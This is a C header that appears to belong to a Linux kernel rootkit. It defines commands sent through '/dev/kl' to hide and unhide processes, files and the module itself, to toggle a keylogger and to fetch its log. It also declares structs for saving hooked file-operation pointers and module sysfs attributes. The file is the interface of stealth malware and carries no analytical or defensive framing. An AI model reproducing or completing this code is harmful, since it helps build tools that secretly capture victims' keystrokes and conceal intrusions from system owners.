#define KL_CMD_HIDE_PROC 1
#define KL_CMD_UNHIDE_PROC 2
#define KL_CMD_HIDE_FILE 3
#define KL_CMD_UNHIDE_FILE 4
#define KL_CMD_KEYLOG_ON 5
#define KL_CMD_KEYLOG_OFF 6
#define KL_CMD_HIDE_MOD 7
#define KL_CMD_UNHIDE_MOD 8

#define KL_CMD_SET_LOG_BUFFER 9
#define KL_CMD_GET_LOG 10

#define KL_PATH "/dev/kl"
#define KL_CLIENT "kl-client"
#define KL_LOG_PATH "./log.txt"

#define MAX_FILE_PATH_LEN 256
#define MAX_BUF_LEN 256
#define TMP_BUF_LEN 16
#define MAX_PID_LEN 16

__attribute__((__packed__)) struct kl_req {
  char pid[MAX_PID_LEN];
  char file_path[MAX_FILE_PATH_LEN];
  int cid; // client pid
};

__attribute__((__packed__)) struct kl_log_req {
  char *buf;
  size_t len;
};

static struct modinfo {
  struct module_sect_attrs *sect_attrs;
  struct module_notes_attrs *notes_attrs;
  struct kobject *holders_dir;
};

static struct fileinfo {
  void *old_fop_pointer;
  void *old_iop_pointer;

  void *old_parent_fop_pointer;
  void *old_parent_iop_pointer;

  char *file_path;
  
  int released;
};

/* directory entry info */
struct linux_dirent {
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen; // length of the entry
  char d_name[];
};
